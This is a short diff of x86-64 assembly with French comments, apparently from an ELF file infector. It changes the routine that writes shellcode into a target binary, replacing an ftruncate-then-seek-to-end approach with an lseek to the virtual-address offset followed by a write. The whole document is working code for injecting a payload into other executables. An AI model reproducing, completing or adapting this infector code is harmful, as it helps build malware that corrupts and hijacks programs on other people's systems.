@@ -146,24 +146,18 @@ _start:
 
 
     ; append du shellcode
-    ; 1 etendre le fichier a vaddr (r14)
-    mov rdi, [fd]   ; fd du binaire cible
-    mov rsi, r14    ; nouvelle taille = vaddr
-    mov rax, 77     ; syscall ftruncate
+    ; 1 se placer a l'offset vaddr (r14)
+    mov rdi, [fd]
+    mov rsi, r14    ; offset = vaddr
+    mov rdx, 0      ; SEEK_SET
+    mov rax, 8      ; lseek
     syscall
 
-    ; 2 se placer a la fin du fichier
+    ; 2 ecrire le shellcode (etend le fichier au passage)
     mov rdi, [fd]
-    xor rsi, rsi
-    mov rdx, 2      ; SEEK_END
-    mov rax, 8      ; syscall lseek
-    syscall
-
-    ; 3 ecrire le shellcode
-    mov rdi, [fd]
-    mov rsi, r13    ; pointeur vers le shellcode
-    mov rdx, r15    ; taille du shellcode
-    mov rax, 1      ; syscall write
+    mov rsi, r13    ; pointeur shellcode
+    mov rdx, r15    ; taille
+    mov rax, 1      ; write
     syscall
 
     ; exit(0)
